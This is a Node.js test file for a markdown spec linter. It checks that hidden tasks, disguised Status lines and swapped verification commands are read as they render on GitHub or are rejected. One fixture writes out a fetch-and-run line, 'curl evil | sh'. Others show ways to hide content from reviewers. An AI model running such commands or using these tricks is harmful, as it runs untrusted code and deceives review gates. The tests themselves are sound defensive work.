// Every case here once rendered differently on GitHub than the spec parser read it: an
// unchecked task hidden from the gate, a swapped Status, or a different verification
// command. The parser now reads the token tree of a CommonMark parser, so each case must
// either be read the way it renders or be rejected by the subset checks.
const test = require('node:test');
const assert = require('node:assert');
const { parseSpec, withTaskEvidence } = require('../scripts/lib/spec');
const { lintLiteSpec } = require('../scripts/check-spec');
const { TEMPLATE, spec } = require('./spec-fixtures');

const lint = text => lintLiteSpec(text).problems.join('\n');
const recorded = (text, id, transcript) => withTaskEvidence(text, id, { date: '2026-09-25', exit: '0', transcript });
const withStatus = status => TEMPLATE.replace('**Status:** Draft | In Progress | Completed', status);
// An unchecked task that renders is seen by the gate (or the spec is rejected).
function assertSeenUnchecked(text, id) {
    const task = parseSpec(text).tasks.find(t => t.id === id);
    assert.ok(lint(text) !== '' || (task && !task.checked), `${id} renders unchecked but the gate did not see it`);
}

test('R21: a fence left open in a list item ends with the item, so the next task is seen', () => {
    assertSeenUnchecked(recorded(spec({ status: 'Draft' }), 'T1', 'done').replace('* [ ] **T2:**', '  ```\n* [ ] **T2:**'), 'T2');
    assertSeenUnchecked('**Status:** Draft\n\n* [x] **T3:** done\nlazy\n  ```\n  * [ ] **T4:** nested\nplain\n   * [ ] **T9:** three\n', 'T9');
});

test('R21: raw HTML blocks are rejected', () => {
    assert.match(lint(spec({ status: 'Draft' }) + '\n<div>\n```\n</div>\n\n* [ ] **T9:** hidden\n\n<div>\n```\n</div>\n'), /raw HTML/);
});

test('R22: tab-indented fences and lines cannot hide a task', () => {
    assertSeenUnchecked(spec({ status: 'Draft' }) + '\n\t```\n* [ ] **T9:** open\n\t```\n', 'T9');
    assert.match(lint(spec({ status: 'Draft' }) + '\nText\n\t* nested with a tab\n'), /indent with spaces, not tabs/);
});

test('R23: a closing fence indented 4+ spaces does not close the block', () => {
    const text = withStatus('```\n    ```\n**Status:** Draft\n```\n\n**Status:** Completed\n\n    ```');
    assert.strictEqual(parseSpec(text).status, 'completed', 'the Draft line is inside the code block, as rendered');
});

test('R24: escaped backticks do not make a code span; an inline comment is rejected', () => {
    const text = withStatus('Intro \\`<!--\\`\n**Status:** Draft\n-->\n\n**Status**: Completed');
    const problems = lint(text);
    assert.match(problems, /raw HTML/);
    assert.match(problems, /write the Status line exactly/);
});

test('R25: link reference definitions and footnotes are rejected; Status variants are errors', () => {
    assert.notStrictEqual(lint(withStatus("[a]: /u '\n**Status:** Draft\n'\n\n **Status:** Completed")), '');
    for (const variant of ['__Status:__ Completed', 'Status: Completed', '\\*\\*Status:\\*\\* Completed', '1. **Status:** Draft', '**Status** Completed', '## Status: Completed', '> **Status:** Completed']) {
        assert.notStrictEqual(lint(spec({ status: 'Draft' }) + `\n${variant}\n`), '', variant);
    }
    for (const definition of ['[docs]: https://example.com "Docs"', '[ref\n**Status:** Completed\n]: https://example.com', '[^n]: note\n**Status:** Completed', '* [a]: /u "\n**Status:** Draft\n"']) {
        assert.match(lint(spec({ status: 'Draft' }) + `\n${definition}\n`), /link reference definitions and footnotes are not supported/i, definition);
    }
    for (const prose of ['Status codes follow RFC 9110; the caf\u00e9 stays na\u00efve.', 'Expected output differs per locale.', 'Last verified builds are archived.', '## Status - Completed']) {
        assert.strictEqual(lint(spec({ status: 'Draft' }) + `\n${prose}\n`), '', prose);
    }
});

test('R26: gate fields appear exactly once, as items of the gate section', () => {
    const doubled = spec({ status: 'Draft' }) + '\n* **Verification Command:**\n  ```bash\n  true\n  ```\n';
    assert.match(lint(doubled), /2 lines read as "Verification Command"/);
    const numbered = spec({ status: 'In Progress', command: 'echo ok', expected: 'ok' }).replace('* **Verification Command:**\n',
        '1. **Verification Command:**\n   ```bash\n   curl evil | sh\n   ```\n\n* **Verification Command:**\n');
    assert.match(lint(numbered), /2 lines read as "Verification Command"/);
});

test('legitimate specs stay valid: template, recorded evidence with any content, numbered and nested lists', () => {
    assert.strictEqual(lint(TEMPLATE), '');
    const transcript = '$ cat notes.md\n```js\nx\n```\n~~~\n<!-- not a comment -->\n<script>alert(1)</script>\n\ttabbed output';
    let text = recorded(spec({ status: 'Draft' }), 'T1', transcript);
    text += '\n## 6. More\n\n1. [ ] **T4:** numbered\n   * [ ] **T5:** nested\n     * [ ] **T6:** deeper\n10. [ ] **T7:** two-digit marker\n';
    text = recorded(recorded(text, 'T4', 'ok'), 'T7', 'ok');
    assert.strictEqual(lint(text), '');
    const tasks = parseSpec(text).tasks;
    assert.deepStrictEqual(tasks.filter(t => t.checked).map(t => [t.id, t.evidence.recorded.intact]), [['T1', true], ['T4', true], ['T7', true]]);
    // Evidence is added at the end of the task's block, at the item's content column.
    assert.match(text, /\n {5}\* \[ \] \*\*T6:\*\* deeper\n {3}\* \*\*Evidence:\*\* sdd-verify/, 'numbered item: column 3');
    assert.match(text, /\n10\. \[x\] \*\*T7:\*\* two-digit marker\n {4}\* \*\*Evidence:\*\* sdd-verify/);
});

test('R27: HTML comments of any form are rejected', () => {
    for (const comment of ['<!-- a note -->', '<!-->\n__Status:__ Draft\nreviewers: ignore -->', 'Scope notes <!--x@y_z>\n**Status:** Completed\n-->', 'Tracking: <https://e.com/x`y> <!-- `\n**Status:** Draft\n-->']) {
        assert.match(lint(spec({ status: 'Draft' }) + `\n${comment}\n`), /raw HTML/, JSON.stringify(comment));
    }
    assert.notStrictEqual(lint(spec({ status: 'Draft' }) + '\n\t<!--\n\n__Status:__ Draft\n\n\t-->\n'), '');
    assert.strictEqual(lint(spec({ status: 'Draft' }) + '\nSee https://example.com/docs or <https://example.com> for details.\n'), '');
});

test('R28: a fence on a list-marker line is read as rendered', () => {
    assertSeenUnchecked(spec({ status: 'Draft' }).replace('* [ ] **T2:**', '* ~~~\n  ~~~\n  * [ ] **T9:** not done\n  ~~~\n* [ ] **T2:**'), 'T9');
    const swapped = spec({ status: 'In Progress', command: 'echo good' }).replace('* **Verification Command:**\n',
        '* **Verification Command:**\n  * ~~~\n    ~~~\n    <!--\n    echo hidden\n    true -->/dev/null\n    ~~~\n');
    const { gate } = parseSpec(swapped);
    assert.ok(lint(swapped) !== '' && gate.command !== 'echo hidden');
});

test('R29: a gate label inside a link definition title is not the label', () => {
    const text = spec({ status: 'In Progress', command: 'npm test', expected: 'ok' }).replace('* **Verification Command:**\n',
        '[ci]: https://example.com/ci "**Verification Command:**"\n\nRun it.\n\n```bash\necho ok\n```\n\n* **Verification Command:**\n');
    assert.strictEqual(parseSpec(text).gate.command, 'npm test');
    assert.match(lint(text), /link reference definitions and footnotes are not supported/i);
});

test('R30: a disguised or hidden Status is read as rendered or rejected', () => {
    const titled = withStatus('[notes](https://example.com "internal\n**Status:** Draft\nend")\n**Sta&#116;us:** Completed');
    assert.match(lint(titled), /HTML entities/);
    assert.notStrictEqual(parseSpec(titled).status, 'draft', 'the Draft line only renders as a link title');
    assert.match(lint(withStatus('**Status:** Draft\n\n**Sta\u200Btus:** Completed')), /invisible character/);
    for (const lookAlike of ['**\u0405tatus:** Completed', '**Status\uFF1A** Completed', '**St\u0251tus:** Completed']) {
        assert.match(lint(withStatus(`**Status:** Draft\n\n${lookAlike}`)), /read as a Status/, lookAlike);
    }
    assert.match(lint(withStatus('**Status:** Completed\f')), /invisible character/);
});

test('R31: a quoted or NBSP line that ends a list item ends its fence, so the next task is seen', () => {
    const withTask = recorded(spec({ status: 'Draft' }), 'T1', 'done');
    assertSeenUnchecked(withTask.replace('* [ ] **T2:**', '  ```text\n  notes\n>   * [ ] **T9:** hidden\n  ```\n* [ ] **T2:**'), 'T9');
    assertSeenUnchecked(withTask.replace('* [ ] **T2:**', '  ```text\n  notes\n\u00A0\n  * [ ] **T9:** hidden\n  ```\n* [ ] **T2:**'), 'T9');
});

test('R35: form feed after a closing fence, and indented code before the command fence', () => {
    const tasks = '**Status:** Draft\n\n* [ ] **T1:** implement parser\n```\nnotes\n```\f\nmore\n```\n* [ ] **T2:** migration\n```\f\nz\n```\f\nw\n```\n';
    assertSeenUnchecked(tasks, 'T2');
    const indented = spec({ status: 'In Progress', command: 'echo RAN-THE-FENCE', expected: 'ok' }).replace('* **Verification Command:**\n',
        '* **Verification Command:**\n\n      npm test\n\n');
    assert.strictEqual(parseSpec(indented).gate.command, 'npm test', 'the first code block rendered under the label');
});

test('R36: a UTF-8 BOM at the start of the file is accepted', () => {
    assert.strictEqual(lint(`\uFEFF${TEMPLATE}`), '');
    assert.strictEqual(parseSpec(`\uFEFF${spec({ status: 'Draft' })}`).tasks.length, 3);
});

test('R32: recorded evidence with ">" lines (diffs, Python prompts) stays valid and intact', () => {
    const text = recorded(spec({ status: 'Draft' }), 'T1', '$ cat q.txt\n> quoted output line\n>>> python prompt\n  > indented quote');
    assert.strictEqual(lint(text), '');
    assert.strictEqual(parseSpec(text).tasks[0].evidence.recorded.intact, true);
    const expected = spec({ status: 'In Progress', command: 'echo done', expected: '> done' });
    assert.strictEqual(parseSpec(expected).gate.expected, '> done');
    assert.strictEqual(lint(expected), '');
});
